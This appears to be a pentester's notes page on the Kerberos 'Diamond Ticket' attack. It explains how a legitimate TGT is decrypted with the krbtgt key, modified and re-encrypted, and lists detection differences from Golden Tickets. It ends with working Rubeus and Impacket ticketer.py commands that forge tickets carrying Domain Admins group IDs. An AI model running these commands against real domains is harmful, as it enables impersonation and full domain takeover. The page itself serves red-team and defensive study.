# Diamond-Tickets

Probably originate from Blackhat 2015 by [Tal Be’ery](https://twitter.com/talbeerysec) and [Michael Cherny](https://twitter.com/chernymi). In their [talk](https://www.youtube.com/watch?v=7qbSFYVQJ7A), and subsequent [brief](https://www.blackhat.com/docs/eu-15/materials/eu-15-Beery-Watching-The-Watchdog-Protecting-Kerberos-Authentication-With-Network-Monitoring-wp.pdf), '*WATCHING THE WATCHDOG: PROTECTING KERBEROS AUTHENTICATION WITH NETWORK MONITORING*' - [TrustedSec - Diamond in the ruff Blog](https://www.trustedsec.com/blog/a-diamond-in-the-ruff/) - they termed an attack 'Diamond PAC Attack'
1. Requesting a TGT without a Privilege Attribute Certificate (PAC)
2. Ensuring the service account for the service that was to be accessed does not have the ‘[NA’ bit set in its UserAccountControl (UAC) attribute](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/dd302fd1-0aa7-406b-ad91-2a6b35738557)
3. Forging a PAC and signing it with the **KRBTGT** key
4. Injecting it into the resulting Service Ticket (ST) by including it in the *enc_authorization_data* section of the TGS-REQ

[Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond) and [TrustedSec - Diamond in the ruff Blog](https://www.trustedsec.com/blog/a-diamond-in-the-ruff/)  - *"When forging tickets, before [November 2021 updates](https://msrc.microsoft.com/update-guide/releasenote/2021-Nov), the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets."* - Diamond tickets work, but Diamond PAC attack does not.

A Diamond ticket are a TGT which can be used to access any service as any user. Forged by modifying the fields of a legitimate TGT that was issued by a DC.
- Unlike [[Golden-Tickets]], require access to the AES256 key
- Request a TGT
- Decrypting the TGT with krbtgt hash
- Modifying the desired fields of the ticket
- Re-Encrypting

Diamond tickets are similar to [[Golden-Tickets]], but due to Golden tickets been forged offline they are detectable:
- Look for TGS-REQs that have no corresponding AS-REQ.
- Look for TGTs that have silly values, such as Mimikatz's default 10-year lifetime.
- Weird requests to access resource from where an identity is not tied to resource
Whereas Diamond Tickets are better due to:
- TGS-REQs will have a preceding AS-REQ.
- The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

Use [[Rubeus-Cheatsheet]]
```powershell
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid
# Example - Hacker recipes
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
# Example - Hacktricks
.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512
# Explaination from Hacktricks
# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```

or [[Impacket-Cheatsheet]]
```python
ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
```

## References

[Hacktricks - Diamond Tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket)
[Hacker Recipes Diamond Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond) 
[TrustedSec CoAuthored with Charlie Clark- Diamond in the ruff Blog](https://www.trustedsec.com/blog/a-diamond-in-the-ruff/)
[Charlie Clark - CoAuthor of Diamond in the Ruff Trusted Sec](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)